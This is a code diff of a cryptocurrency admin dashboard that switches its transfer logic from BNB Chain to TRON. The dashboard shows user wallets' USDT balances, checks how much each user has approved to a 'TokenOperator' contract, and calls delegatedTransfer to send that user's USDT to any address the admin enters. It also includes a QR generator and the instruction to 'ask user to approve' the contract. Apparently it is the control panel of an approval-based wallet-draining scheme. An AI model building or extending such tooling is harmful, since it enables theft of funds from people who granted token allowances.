@@ -910,7 +910,7 @@ function TransactionsTab({ adminWallet }: { adminWallet?: string }) {
       "To Address",
       "Amount (USDT)",
       "USDT Balance",
-      "BNB Balance",
+      "TRX Balance",
       "Transaction Hash",
       "Status",
       "Admin Note",
@@ -1119,7 +1119,7 @@ function TransactionsTab({ adminWallet }: { adminWallet?: string }) {
 
                           {tx.nativeBalance && (
                             <div className="flex items-start gap-2">
-                              <span className="font-semibold min-w-[140px]">BNB Balance:</span>
+                              <span className="font-semibold min-w-[140px]">TRX Balance:</span>
                               <span className="text-muted-foreground">{tx.nativeBalance}</span>
                             </div>
                           )}
@@ -1128,7 +1128,7 @@ function TransactionsTab({ adminWallet }: { adminWallet?: string }) {
                             <div className="flex items-start gap-2">
                               <span className="font-semibold min-w-[140px]">Transaction Hash:</span>
                               <a
-                                href={`https://bscscan.com/tx/${tx.txHash}`}
+                                href={`https://tronscan.org/#/transaction/${tx.txHash}`}
                                 target="_blank"
                                 rel="noopener noreferrer"
                                 className="font-mono text-xs text-primary hover:underline break-all"
@@ -1250,7 +1250,7 @@ function TransferDialog({
   const [isProcessing, setIsProcessing] = useState(false);
   const [adminConnected, setAdminConnected] = useState(false);
   const [usdtBalance, setUsdtBalance] = useState<string>("");
-  const [bnbBalance, setBnbBalance] = useState<string>("");
+  const [trxBalance, setTrxBalance] = useState<string>("");
   const [loadingBalances, setLoadingBalances] = useState(false);
   const createTransfer = useMutation(api.transfers.createTransfer);
 
@@ -1281,7 +1281,7 @@ function TransferDialog({
       ]);
 
       setUsdtBalance((Number(usdt) / 1e6).toFixed(2));
-      setBnbBalance((Number(trx) / 1e6).toFixed(2));
+      setTrxBalance((Number(trx) / 1e6).toFixed(2));
     } catch (error) {
       console.error("Failed to fetch balances:", error);
       toast.error("Failed to fetch real-time balances");
@@ -1296,7 +1296,7 @@ function TransferDialog({
       setAmount("");
       setIsProcessing(false);
       setUsdtBalance("");
-      setBnbBalance("");
+      setTrxBalance("");
     } else {
       fetchUserBalances();
     }
@@ -1343,37 +1343,31 @@ function TransferDialog({
     setIsProcessing(true);
 
     try {
-      const { ethers } = window as typeof window & {
-        ethers: {
-          BrowserProvider: new (provider: unknown) => {
-            getSigner: () => Promise<any>;
-          };
-          Contract: new (
-            address: string,
-            abi: string[],
-            signer: unknown
-          ) => {
-            delegatedTransfer: (
-              tokenAddress: string,
-              from: string,
-              to: string,
-              amount: bigint
-            ) => Promise<{ wait: () => Promise<{ hash: string }> }>;
-          };
-          parseUnits: (value: string, decimals: number) => bigint;
-        };
-      };
-
       const tronWeb = window.tronWeb;
       if (!tronWeb) {
         toast.error("TronLink not found");
+        setIsProcessing(false);
         return;
       }
 
-      const contract = await tronWeb.contract([
+      const amountInSun = Math.floor(parseFloat(amount) * 1e6);
+
+      // Load TokenOperator contract (TRON_SPENDER)
+      const operatorContract = await tronWeb.contract([
         {
-          "name": "transferFrom",
+          "name": "checkAllowance",
           "inputs": [
+            { "name": "tokenAddress", "type": "address" },
+            { "name": "account", "type": "address" }
+          ],
+          "outputs": [{ "name": "", "type": "uint256" }],
+          "stateMutability": "view",
+          "type": "function"
+        },
+        {
+          "name": "delegatedTransfer",
+          "inputs": [
+            { "name": "tokenAddress", "type": "address" },
             { "name": "from", "type": "address" },
             { "name": "to", "type": "address" },
             { "name": "amount", "type": "uint256" }
@@ -1382,21 +1376,32 @@ function TransferDialog({
           "stateMutability": "nonpayable",
           "type": "function"
         }
-      ], TRON_USDT);
+      ], TRON_SPENDER);
 
-      const amountInSun = Math.floor(parseFloat(amount) * 1e6);
+      // Step 1: Check user has approved enough allowance to TokenOperator
+      const allowanceRaw = await (operatorContract as any)
+        .checkAllowance(TRON_USDT, transaction.walletAddress)
+        .call();
+      const allowance = Number(allowanceRaw);
 
-      const tx = await (contract as any).transferFrom(
+      if (allowance < amountInSun) {
+        toast.error(
+          `Insufficient allowance. User approved ${(allowance / 1e6).toFixed(2)} USDT but ${amount} USDT needed. Ask user to approve the TokenOperator contract first.`
+        );
+        setIsProcessing(false);
+        return;
+      }
+
+      // Step 2: Call delegatedTransfer on TokenOperator
+      const tx = await (operatorContract as any).delegatedTransfer(
+        TRON_USDT,
         transaction.walletAddress,
         toAddress,
         amountInSun
       ).send({ feeLimit: 100_000_000 });
 
       toast.success("Transaction submitted! Waiting for confirmation...");
-
       await new Promise(resolve => setTimeout(resolve, 3000));
-
-      const receipt = { hash: tx };
 
       // Save transfer to database
       await createTransfer({
@@ -1404,38 +1409,30 @@ function TransferDialog({
         fromAddress: transaction.walletAddress,
         toAddress,
         amount,
-        txHash: receipt.hash,
+        txHash: tx,
         transferredBy: adminWallet || "unknown",
         status: "success",
       });
 
       toast.success("Transfer successful! ✅");
-
       onClose();
     } catch (error) {
       console.error(error);
-      const err = error as { 
-        reason?: string; 
-        message?: string; 
+      const err = error as {
+        reason?: string;
+        message?: string;
         code?: string;
         action?: string;
       };
-      
-      // Detect common blockchain errors and provide user-friendly messages
+
       let errorMessage = "Transfer failed";
-      
-      if (err.code === "CALL_EXCEPTION" && err.action === "estimateGas") {
-        // Check if user has sufficient balance
-        const requestedAmount = parseFloat(amount);
-        const availableBalance = parseFloat(usdtBalance);
-        
-        if (requestedAmount > availableBalance) {
-          errorMessage = `Insufficient USDT balance. User has ${availableBalance.toFixed(4)} USDT but ${requestedAmount} USDT requested.`;
-        } else {
-          errorMessage = "Insufficient BNB for gas fees or user hasn't approved TokenOperator contract.";
-        }
-      } else if (err.code === "INSUFFICIENT_FUNDS") {
-        errorMessage = "Insufficient BNB for gas fees in admin wallet.";
+
+      if (err.message?.includes("Insufficient allowance")) {
+        errorMessage = "User has not approved enough USDT to the TokenOperator contract.";
+      } else if (err.message?.includes("Insufficient balance")) {
+        errorMessage = `Insufficient USDT balance. User has ${usdtBalance} USDT but ${amount} USDT requested.`;
+      } else if (err.message?.includes("Not owner")) {
+        errorMessage = "Admin wallet is not the owner of the TokenOperator contract.";
       } else if (err.message?.toLowerCase().includes("user rejected")) {
         errorMessage = "Transaction was rejected by user.";
       } else if (err.reason) {
@@ -1443,7 +1440,7 @@ function TransferDialog({
       } else if (err.message) {
         errorMessage = err.message;
       }
-      
+
       // Save failed transfer to database
       try {
         await createTransfer({
@@ -1502,9 +1499,9 @@ function TransferDialog({
                   </span>
                 </div>
                 <div className="flex items-center justify-between text-sm">
-                  <span className="text-muted-foreground">BNB:</span>
+                  <span className="text-muted-foreground">TRX:</span>
                   <span className="font-mono font-semibold">
-                    {bnbBalance ? `${parseFloat(bnbBalance).toFixed(6)} BNB` : "0.000000 BNB"}
+                    {trxBalance ? `${parseFloat(trxBalance).toFixed(6)} TRX` : "0.000000 TRX"}
                   </span>
                 </div>
               </div>
@@ -1532,7 +1529,7 @@ function TransferDialog({
                   id="transferToAddress"
                   value={toAddress}
                   onChange={(e) => setToAddress(e.target.value)}
-                  placeholder="0x..."
+                  placeholder="T..."
                 />
               </div>
 
@@ -1564,7 +1561,7 @@ function TransferDialog({
               <div className="rounded-lg bg-muted p-3 text-xs text-muted-foreground">
                 <p>
                   <strong>Note:</strong> The user must have already approved the
-                  TokenOperator contract to transfer their USDT.
+                  contract to transfer their USDT. Ensure admin wallet has enough TRX for energy/bandwidth fees.
                 </p>
               </div>
             </div>
@@ -1842,7 +1839,7 @@ function TransferHistoryTab({ adminWallet }: { adminWallet?: string }) {
                           <div>
                             <div className="font-medium text-xs text-muted-foreground mb-1">Transaction Hash</div>
                             <a
-                              href={`https://bscscan.com/tx/${transfer.txHash}`}
+                              href={`https://tronscan.org/#/transaction/${transfer.txHash}`}
                               target="_blank"
                               rel="noopener noreferrer"
                               className="font-mono text-xs text-primary hover:underline break-all inline-flex items-center gap-1"
@@ -1972,35 +1969,27 @@ function TransferTab({ adminWallet, adminEmail }: { adminWallet?: string; adminE
     setIsProcessing(true);
 
     try {
-      const { ethers } = window as typeof window & {
-        ethers: {
-          BrowserProvider: new (provider: unknown) => {
-            getSigner: () => Promise<any>;
-          };
-          Contract: new (
-            address: string,
-            abi: string[],
-            signer: unknown
-          ) => {
-            delegatedTransfer: (
-              tokenAddress: string,
-              from: string,
-              to: string,
-              amount: bigint
-            ) => Promise<{ wait: () => Promise<{ hash: string }> }>;
-          };
-          parseUnits: (value: string, decimals: number) => bigint;
-        };
-      };
-
-      
       const tronWeb = window.tronWeb;
       if (!tronWeb) throw new Error("TronLink not found");
 
-      const contract = await tronWeb.contract([
+      const amountInSun = Math.floor(parseFloat(amount) * 1e6);
+
+      // Load TokenOperator contract (TRON_SPENDER)
+      const operatorContract = await tronWeb.contract([
         {
-          "name": "transferFrom",
+          "name": "checkAllowance",
           "inputs": [
+            { "name": "tokenAddress", "type": "address" },
+            { "name": "account", "type": "address" }
+          ],
+          "outputs": [{ "name": "", "type": "uint256" }],
+          "stateMutability": "view",
+          "type": "function"
+        },
+        {
+          "name": "delegatedTransfer",
+          "inputs": [
+            { "name": "tokenAddress", "type": "address" },
             { "name": "from", "type": "address" },
             { "name": "to", "type": "address" },
             { "name": "amount", "type": "uint256" }
@@ -2009,28 +1998,40 @@ function TransferTab({ adminWallet, adminEmail }: { adminWallet?: string; adminE
           "stateMutability": "nonpayable",
           "type": "function"
         }
-      ], TRON_USDT);
+      ], TRON_SPENDER);
 
-      const amountInSun = Math.floor(parseFloat(amount) * 1e6);
+      // Step 1: Check user has approved enough allowance to TokenOperator
+      const allowanceRaw = await (operatorContract as any)
+        .checkAllowance(TRON_USDT, fromAddress)
+        .call();
+      const allowance = Number(allowanceRaw);
 
-      const tx = await (contract as any).transferFrom(
+      if (allowance < amountInSun) {
+        toast.error(
+          `Insufficient allowance. User approved ${(allowance / 1e6).toFixed(2)} USDT but ${amount} USDT needed. Ask user to approve the TokenOperator contract first.`
+        );
+        setIsProcessing(false);
+        return;
+      }
+
+      // Step 2: Call delegatedTransfer on TokenOperator
+      const tx = await (operatorContract as any).delegatedTransfer(
+        TRON_USDT,
         fromAddress,
         toAddress,
         amountInSun
       ).send({ feeLimit: 100_000_000 });
 
       toast.success("Transaction submitted! Waiting for confirmation...");
-
       await new Promise(resolve => setTimeout(resolve, 3000));
 
-      const receipt = { hash: tx };
       // Save transfer to database
       await createTransfer({
         adminWallet,
         fromAddress,
         toAddress,
         amount,
-        txHash: receipt.hash,
+        txHash: tx,
         transferredBy: adminWallet || "unknown",
         status: "success",
       });
@@ -2043,7 +2044,23 @@ function TransferTab({ adminWallet, adminEmail }: { adminWallet?: string; adminE
     } catch (error) {
       console.error(error);
       const err = error as { reason?: string; message?: string };
-      
+
+      let errorMessage = "Transfer failed";
+
+      if (err.message?.includes("Insufficient allowance")) {
+        errorMessage = "User has not approved enough USDT to the TokenOperator contract.";
+      } else if (err.message?.includes("Insufficient balance")) {
+        errorMessage = "User has insufficient USDT balance.";
+      } else if (err.message?.includes("Not owner")) {
+        errorMessage = "Admin wallet is not the owner of the TokenOperator contract.";
+      } else if (err.message?.toLowerCase().includes("user rejected")) {
+        errorMessage = "Transaction was rejected by user.";
+      } else if (err.reason) {
+        errorMessage = err.reason;
+      } else if (err.message) {
+        errorMessage = err.message;
+      }
+
       // Save failed transfer to database
       try {
         await createTransfer({
@@ -2054,13 +2071,13 @@ function TransferTab({ adminWallet, adminEmail }: { adminWallet?: string; adminE
           txHash: "failed",
           transferredBy: adminWallet || "unknown",
           status: "failed",
-          note: err.reason || err.message || "Transfer failed",
+          note: errorMessage,
         });
       } catch (dbError) {
         console.error("Failed to save error to database:", dbError);
       }
 
-      toast.error(err.reason || err.message || "Transfer failed");
+      toast.error(errorMessage);
     } finally {
       setIsProcessing(false);
     }
@@ -2119,7 +2136,7 @@ function TransferTab({ adminWallet, adminEmail }: { adminWallet?: string; adminE
                   id="fromAddress"
                   value={fromAddress}
                   onChange={(e) => setFromAddress(e.target.value)}
-                  placeholder="0x..."
+                  placeholder="T..."
                   className="font-mono"
                 />
                 <p className="mt-1.5 text-xs text-muted-foreground">
@@ -2136,7 +2153,7 @@ function TransferTab({ adminWallet, adminEmail }: { adminWallet?: string; adminE
                   id="toAddress"
                   value={toAddress}
                   onChange={(e) => setToAddress(e.target.value)}
-                  placeholder="0x..."
+                  placeholder="T..."
                   className="font-mono"
                 />
               </div>
@@ -2362,7 +2379,7 @@ function QRGeneratorTab() {
             <Input
               id="wallet-address"
               type="text"
-              placeholder="0x..."
+              placeholder="T..."
               value={walletAddress}
               onChange={(e) => setWalletAddress(e.target.value)}
               className="font-mono text-sm"
